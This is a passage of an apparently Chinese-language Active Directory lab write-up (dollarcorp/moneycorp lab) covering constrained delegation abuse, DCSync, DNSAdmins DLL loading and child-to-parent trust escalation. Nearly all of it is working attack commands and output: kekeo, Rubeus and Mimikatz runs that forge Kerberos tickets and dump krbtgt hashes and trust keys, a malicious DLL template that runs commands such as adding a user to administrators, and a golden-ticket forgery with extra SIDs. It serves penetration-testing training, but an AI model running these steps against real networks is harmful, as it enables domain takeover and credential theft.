dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local


```

只有一台计算机：DCORP-ADMINSRV$

注意```msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}```

由于前面我们已经枚举到DCORP-ADMINSRV$的哈希，这里我们直接使用
```
DCORP-ADMINSRV$：5e77978a734e3a7f3895fb0fdbda3b96
```

### 方法一：kekeo.exe

```
tgt::ask /user:DCORP-ADMINSRV$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
```

执行
```
PS C:\ad> .\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with  9 modules * * */

kekeo # tgt::ask /user:DCORP-ADMINSRV$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
Realm        : dollarcorp.moneycorp.local (dollarcorp)
User         : DCORP-ADMINSRV$ (DCORP-ADMINSRV$)
CName        : DCORP-ADMINSRV$  [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5e77978a734e3a7f3895fb0fdbda3b96
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

已生成一个TGT，下面命令生成一个TGS
```
tgs::s4u /tgt:TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```
执行
```
kekeo # tgs::s4u /tgt:TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@d
ollarcorp.moneycorp.local /service:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
Ticket  : TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: DCORP-ADMINSRV$ @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] T: [2/15/2022 7:53:59 AM ; 2/15/2022 5:53:59 PM] {R:2/22/2022 7:53:59 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 486676190bd5124fee79374156db13d5410fdc91159519f9537d1448ab1e7d73
  [s4u2self]  Administrator@dollarcorp.moneycorp.local
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
Service(s):
  [s4u2proxy] TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL
  [s4u2proxy] Alternative ServiceName: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOC
AL_ALT.kirbi'
```

已生成一个TGS

下面命令利用mimikatz导入到内存中
```
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
执行
```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp
.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARC
ORP.MONEYCORP.LOCAL_ALT.kirbi

* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirb
i': OK
```
已把TGS导入内存

klist查看
```
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (3)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/15/2022 7:55:59 (local)
        End Time:   2/15/2022 17:53:59 (local)
        Renew Time: 2/22/2022 7:53:59 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
(略)
```


执行dcsync，导出dcorp\krbtgt的NTML哈希
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
执行
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2/16/2019 11:01:46 PM
Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: b14d886cf45e2efb5170d4d9c4085aa2
```

### 方法二：Rubeus.exe

用Rubeus.exe可以一条命令生成TGT和TGS

```
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
```

klist查看
```
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (5)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/15/2022 8:06:47 (local)
        End Time:   2/15/2022 18:06:46 (local)
        Renew Time: 2/22/2022 8:06:46 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

使用Mimikatz执行dcsync导出dcorp\krbtgt的哈希
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```


问题：Value of msds-allowedtodelegate to attribute of dcorp-adminsrv
答案：{TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}

问题：Alternate service accessed on dcorp-dc by abusing Constrained delegation on dcorp-adminsrv
答案：LDAP

## DNSAdmins 提权
原理： DNSAdmins组的成员可以以 dns.exe(系统)的权限加载任意动态链接库（DLL劫持）
前提：需要一个用户是DNSAdmins组成员，并且拥有这个用户的哈希

枚举：
```
PS C:\ad> Get-NetGroupMember -GroupName "DNSAdmins"


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : DnsAdmins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : srvadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1115
IsGroup      : False
MemberDN     : CN=srv admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```
srvadmin是DnsAdmins组成员
```
srvadmin:a98e18228819e8eec3dfa33cb68b0728
```

下面命令生成一个srvadmin的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
```

模板DLL利用代码：
```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

把system里面的命令换成想要执行的命令即可，例如可以把当前账号添加进管理员用户组：```cmd.exe /k net localgroup administrators user /add```

kali编译成DLL文件：
> x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

利用DNSAdmins group的组成员权限，使用dnscmd.exe (needs RSAT DNS)配置DNS的动态链接库
```
dnscmd dcorp-dc /config /serverlevelplugindll\\172.16.50.66\dll\mimilib.dll
```
重启DNS服务，使得dll劫持生效（不过这一定会影响公共域环境的DNS服务，不要在公共域环境做这个实验）
```
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns
```

# Learning Objective 19:
Task
● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.

这一节主要是跨域访问，子域到父域(Child to Parent)


前面已经知道DA管理员Administrator的哈希
```
Administrator: af0686cc0ca8f04df42210c9ac980760
```
打开一个具有DA权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```

枚举所有Trust tikets
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```

执行：
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
        * aes256_hmac       ff3616ac06c24395fb76b08d7cc7f0038cd257869b43eb13ebaf9a3061929a1e
        * aes128_hmac       a2ab6e6daf483e61ed6ffa50856ad277
        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7

 [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
        * aes256_hmac       1f7bb465843dcd19eaa9ebe5ffdc92f5c8cefd84e7d70fb0ba2a27b41e52b075
        * aes128_hmac       5739ec70d0d4162853c3c2d7954db14d
        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 1/23/2022 11:35:54 PM - CLEAR   - f0 1c 6e 77 b7 5a 7a 00 ab 3c ce 4e 08 c0 17 46 f5 89 25 c3 c5 8b a7 8e 2d 6b 67 97
        * aes256_hmac       b1d0cce7e14b65e8ae122cb5d49767a1b99e0db9c10a960f8bee6315b85c8e0b
        * aes128_hmac       1921343ce7de2cb2188e5e687c7b54f3
        * rc4_hmac_nt       94e5fc7691c1f1b4b6a9c1a97950f5a1

 [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 1/23/2022 11:35:54 PM - CLEAR   - f0 1c 6e 77 b7 5a 7a 00 ab 3c ce 4e 08 c0 17 46 f5 89 25 c3 c5 8b a7 8e 2d 6b 67 97
        * aes256_hmac       e2afb4ff3d023d4af1e56b5592dfc3bcf9733e38f7827bd773bc66433dea6469
        * aes128_hmac       7e55143a5eac219667d2d4ac723dd625
        * rc4_hmac_nt       94e5fc7691c1f1b4b6a9c1a97950f5a1


Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 3/16/2021 7:44:52 AM - CLEAR   - 40 84 47 82 3b 03 64 82 0f 8e bf d3 78 18 df db d4 5f 13 bc 4d 7c df b5 8e f8 e3 29 ae e1 01 ce 20 c4 03 48 8f 4f 4e 77 eb a0 3b 1d 55 84 ba b0 72 62 4d df 34 df 2d 67 e7 78 8a 6a 18 99 87 11 f2 56 d7 34 e5 9b 88 b1 9d 91 b3 4e 11 2f 76 89 c2 45 7d c6 20 9a 83 97 ca 50 0e 33 d2 04 4f 82 83 69 46 d6 13 cf 8f db cd fe 3d 87 66 c9 ca 7f 24 38 ff c0 1b 5a 5f bf 58 b3 c7 83 06 2c f0 da fd f4 1b 46 de ca 61 e6 8e 8f ec d5 a8 6e 57 84 6f 42 cb 8c b3 ff 3f 14 8a c4 7c a7 c0 17 60 31 a0 2c 4b 0c 44 80 9e 37 77 37 df ea 32 96 16 ab e5 a3 f5 0b 8c 46 d9 7f 26 f3 05 7c 7f bb ac 16 be 5c ea a3 50 ee f0 ef 9a 4e fe a3 0a 6d f6 f2 5f c9 54 ee 47 20 02 ae 07 96 c4 c8 08 64 70 56 59 28 22 00 53 74 be 67 45 03 d9 e6 86 e5 36 42
        * aes256_hmac       f13e09bb5b6f02a995d99a4c95982c1e6411b1b252d1aa268c25b9adcd22953f
        * aes128_hmac       20e6b9441a57a19d14c62bb87a055264
        * rc4_hmac_nt       3c26a18320e50801d1c3843a129617f8

 [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 3/20/2021 8:54:34 AM - CLEAR   - eb b8 c7 9a 62 b0 f8 e3 ce b6 0d 22 9d 68 67 a2 dd 8e d4 b1 2f a6 dc 75 ea cd 69 dc 1f 3f cd 7d b5 bb a4 a7 f7 81 61 ed f6 c6 ad a1 e9 38 7c 5b ce 02 42 e0 4e a5 dd 42 70 bc be be 99 79 9b b7 26 94 85 8d 15 8c 82 ac 24 ba 47 4f 13 90 ad 3d 75 f8 25 64 f1 ff 6d ba cc bc ef e8 ed 3f 7b 3a 88 f1 6d 2f ba 15 f6 9b 98 e0 11 aa 56 4e 61 74 af 0f 82 ca 5c c8 e4 7b 46 73 f2 82 12 32 be 58 21 92 b8 86 03 d3 16 db cb d7 38 0a ca 99 a6 b8 20 14 95 a9 8c c2 25 7e dc a7 6b 0c 95 49 5d 0d 38 be ac f1 8b 6e 53 d7 97 38 7c 0d d1 0c 29 d1 8c da 71 89 45 64 aa 35 55 4c f5 be 6d 9f fb c2 fb 07 5e cb 25 ec 38 ae a4 ee ee d7 43 e8 a1 45 63 43 26 69 30 f9 f9 ef 21 a5 cf 31 2a b6 6c d9 b3 cc e9 f2 a6 8d 2e ca f7 f6 c2 c0 66 30 ed ff
        * aes256_hmac       93a29ddd4ad24fde12c2bca0dc08574bb2a2f80d3654a7b4809b18257139c84b
        * aes128_hmac       94ae739b0afa370080237a35e762d2f6
        * rc4_hmac_nt       63ea4769982101c8e8bee58c67419371

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 3/16/2021 7:43:48 AM - CLEAR   - 34 ff 93 5b c5 57 59 34 b9 be 48 7c 32 40 e0 34 52 56 91 9c 45 4b 1e b2 1d 0a 07 87 c6 cd 3a f8 c9 1f f8 2e 91 f5 c5 3f 5b c5 34 f4 5a 42 90 fc f8 6a 00 38 b5 d9 2f 48 c4 3f b5 79 0e 07 f2 5f 14 92 38 90 54 0c 38 9f e7 c3 43 43 c5 79 e2 db 2b 45 73 d8 43 47 9c 8e 9c 7c 35 d4 8b b7 a3 a2 1c f5 5f 5a 7b 0e d0 db bb 5f 62 c3 94 7a 7e 7e 34 48 d2 65 ff 77 5a ee 33 29 64 0c 64 e0 80 77 bd 05 e0 36 b2 e3 c7 e0 d2 bd 33 dd c8 66 e3 b2 39 01 57 81 9b e2 87 6a ec 26 98 f3 c5 0b 04 bf 64 6f f2 4d b6 89 cb b3 a9 d6 a9 32 b2 3f 66 29 61 be 67 27 9c 0a 7a 99 c7 27 61 f1 bf af 53 9e 10 4f c8 56 a3 df 1f 16 8f 85 d9 01 86 dd e8 f5 1f 36 9b 43 51 91 62 24 1a e3 6f 86 ab d9 f8 1f 3d 2b 4a 58 6a 01 a7 e2 05 62 6f 9c 1d 3c 5d 09
        * aes256_hmac       852cfdffd122e0595792a487554bddc6994f4a62bce15c75575094c968218ad8
        * aes128_hmac       340e7e0b5fd707c5ce9c207d7cc19228
        * rc4_hmac_nt       4f6b49aa2becd4dacec0daf1a86dd3fc

 [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 3/20/2021 8:54:34 AM - CLEAR   - bc 2a 0a ae 7d ae 0a f0 b7 2e 04 87 48 5b ad 40 32 c5 a7 9e b0 48 75 2e b9 81 86 5f 93 50 77 ca 86 c7 0f f3 1b 5c 05 35 c7 85 6b 25 78 70 40 dd 69 0f f9 57 1f f9 a3 70 0a ec a4 e9 18 00 64 cf 90 40 22 f2 0e 61 b1 16 78 85 bd 11 28 81 79 e7 17 54 5a 05 99 13 b0 2f bf e4 38 d1 6e b5 0f 4b 80 1e b6 e5 d6 8f 8d 01 f1 74 78 d8 15 44 d1 ff b7 99 b4 50 56 a7 51 07 01 da 48 d8 83 66 46 3e da 1d da 97 b4 af 29 c4 24 27 50 5e ef d4 67 d7 bb df ef 21 94 e4 17 50 2f a1 b2 4b e1 3a 75 49 76 bb 04 0a 34 18 96 d5 ae e0 9c af 11 ae aa 61 84 3c 45 16 db 12 30 79 ef e2 1e 7d cf 6f a5 7a 19 ad 91 b9 df bb d9 45 ba 1b ba 60 b1 68 ba 36 bc 47 1f 59 bb a6 b2 ed 59 ac be 15 89 40 90 39 ea 8c a9 d5 cb 84 b6 ab b3 75 f2 28 c0 99 65 0c
        * aes256_hmac       6add5f0941e99beee725c5b0a8ea78eaf519a6011283f33bab124f8fa2c90a66
        * aes128_hmac       627647090c3f2d24585ddd56b76c2e0b
        * rc4_hmac_nt       340965a2803f7f51e68681b701902ede


Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430

 [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
        * aes256_hmac       1600f6d433093cc534f579dd75b44a8a2f37b983904c507b74f8eb436cd04f4e
        * aes128_hmac       948cc8e718be3f8eecf498cfa5d6996b
        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 1/29/2022 1:19:50 AM - CLEAR   - 9e 38 00 0f f1 61 6b 4f 03 ef 9a 4d 66 44 ce 9f 15 1a ee 57 82 dc 5a a0 92 db 99 03
        * aes256_hmac       d368377248c50ef663e50cf9109512d018b48964ff08e6e06c93ae967ed7ebce
        * aes128_hmac       f523829c0e7edc43630ed264b7864de9
        * rc4_hmac_nt       a4ba38d6d528d447371bc2bf9edd8d18

 [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 1/29/2022 1:19:50 AM - CLEAR   - 9e 38 00 0f f1 61 6b 4f 03 ef 9a 4d 66 44 ce 9f 15 1a ee 57 82 dc 5a a0 92 db 99 03
        * aes256_hmac       b21647a7b6a2996c09c96985d907d13d0bb997016bfa177cc89132fdebd7c6c5
        * aes128_hmac       b7e4341a1b8a9cbe43b8b92447c31c07
        * rc4_hmac_nt       a4ba38d6d528d447371bc2bf9edd8d18
```

下面命令伪造一条到父域```moneycorp.local```的TGT，从上面信息我们得知，父域的SID是：```S-1-5-21-280534878-1496970234-700767426```

这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
```* rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7```这个值

而不是Administrator的NTML的值
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'
```

执行：
```
PS C:\ad\kekeo_old> Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-
1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
ServiceKey: 13d28ca9e5863231c89eda2b2b1756d7 - rc4_hmac_nt
Service   : krbtgt
Target    : moneycorp.local
Lifetime  : 2/15/2022 11:54:26 PM ; 2/13/2032 11:54:26 PM ; 2/13/2032 11:54:26 PM
-> Ticket : C:\AD\kekeo_old\trust_tkt.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

TGT文件已保存到```C:\AD\kekeo_old\trust_tkt.kirbi```

制作一张可以访问父域moneycorp.local的TGS

```
.\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
```

执行：
```
PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local

  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Ticket    : C:\AD\kekeo_old\trust_tkt.kirbi
Service   : krbtgt / moneycorp.local @ dollarcorp.moneycorp.local
Principal : Administrator @ dollarcorp.moneycorp.local

> CIFS/mcorp-dc.moneycorp.local
  * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
```

将 TGS 呈现给目标服务
```
.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
```
执行：
```
PS C:\ad\kekeo_old> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi

  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Destination : Microsoft LSA API (multiple)
 < .\CIFS.mcorp-dc.moneycorp.local.kirbi (RFC KRB-CRED (#22))
 > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
```

现在就可以访问目标的文件系统了。如果能够访问，证明我们升级成了父域的DA
```
PS C:\ad\kekeo_old> ls \\mcorp-dc.moneycorp.local\c$


    Directory: \\mcorp-dc.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   4:33 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---        2/16/2019   9:14 PM                Users
d-----        8/20/2020   2:57 AM                Windows
```


我们同样可以使用 Rubeus来达到同样的效果，注意我们仍然使用最初生成的TGT.这个可以新开一个student VM测试

```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

执行：
```
PS C:\ad> .\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-d
c.moneycorp.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGS

[*] Using domain controller: mcorp-dc.moneycorp.local (172.16.1.1)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/mcorp-dc.moneycorp.local'
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFDDCCBQigAwIBBaEDAgEWooID7zCCA+thggPnMIID46ADAgEFoREbD01PTkVZQ09SUC5MT0NBTKIr
      MCmgAwIBAqEiMCAbBGNpZnMbGG1jb3JwLWRjLm1vbmV5Y29ycC5sb2NhbKOCA5owggOWoAMCARKhAwIB
